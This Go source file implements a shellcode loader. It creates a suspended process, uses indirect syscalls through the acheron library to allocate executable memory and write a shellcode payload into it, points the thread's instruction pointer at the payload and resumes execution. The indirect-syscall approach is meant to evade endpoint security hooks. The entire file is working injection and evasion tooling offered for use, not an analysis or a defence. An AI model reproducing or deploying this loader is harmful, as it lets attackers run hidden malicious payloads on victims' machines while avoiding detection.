package Indirect

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/f1zm0/acheron"
	"golang.org/x/sys/windows"
)

const nullptr = uintptr(0)

type ShellcodeLoader struct {
	Acheron *acheron.Acheron
}

func Init() (*ShellcodeLoader, error) {
	ach, err := acheron.New()
	if err != nil {
		return nil, fmt.Errorf("[-] failed to initialize acheron: %w", err)
	}
	return &ShellcodeLoader{Acheron: ach}, nil
}

func (s *ShellcodeLoader) InjectShellcode(shellcode []byte, exePath string) error {
	fmt.Printf("[!] Using indirect syscalls with acheron (Early Bird APC)...\n")

	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	fmt.Printf("[*] Creating process %s in suspended state...\n", exePath)
	err := windows.CreateProcess(
		syscall.StringToUTF16Ptr(exePath),
		nil,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		si,
		pi,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to create process: %w", err)
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	fmt.Printf("[+] Process created in suspended state: PID %d\n", pi.ProcessId)

	var baseAddr uintptr
	scLen := len(shellcode)

	fmt.Printf("[*] Allocating %d bytes in remote process memory...\n", scLen)
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtAllocateVirtualMemory"),
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&scLen)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to allocate memory: %w", err)
	}
	fmt.Printf("[+] Allocated memory at: 0x%x\n", baseAddr)

	fmt.Printf("[*] Writing shellcode to allocated memory...\n")
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtWriteVirtualMemory"),
		uintptr(pi.Process),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(scLen),
		nullptr,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to write shellcode: %w", err)
	}
	fmt.Println("[+] Shellcode written to memory")

	const CONTEXT_FULL = 0x10007
	type CONTEXT struct {
		P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
		ContextFlags                                   uint32
		MxCsr                                          uint32
		SegCs, SegDs, SegEs, SegFs, SegGs, SegSs       uint16
		EFlags                                         uint32
		Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                   uint64
		Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi         uint64
		R8, R9, R10, R11, R12, R13, R14, R15           uint64
		Rip                                            uint64
	}

	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL

	fmt.Println("[*] Getting thread context...")
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtGetContextThread"),
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if err != nil {
		return fmt.Errorf("[-] failed to get thread context: %w", err)
	}
	//RIP is the instruction pointer in x64 it points the shellcode address to execute
	//EIP is for X86
	fmt.Printf("[+] Thread context retrieved. RIP = 0x%x\n", ctx.Rip)

	fmt.Printf("[*] Setting RIP to shellcode address 0x%x\n", baseAddr)
	ctx.Rip = uint64(baseAddr)

	fmt.Println("[*] Setting thread context with new RIP...")
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtSetContextThread"),
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx)),
	)
	if err != nil {
		return fmt.Errorf("[-] failed to set thread context: %w", err)
	}
	fmt.Printf("[+] Thread context set. RIP = 0x%x\n", ctx.Rip)

	fmt.Println("[*] Resuming thread to start execution at shellcode...")
	_, err = s.Acheron.Syscall(
		s.Acheron.HashString("NtResumeThread"),
		uintptr(pi.Thread),
		nullptr,
	)
	if err != nil {
		return fmt.Errorf("[-] failed to resume thread: %w", err)
	}
	fmt.Println("[+] Thread resumed, shellcode executed via Early Bird APC")

	return nil
}

//Thx archeron for this goat package
//ngl i was in pain doing this, but it works
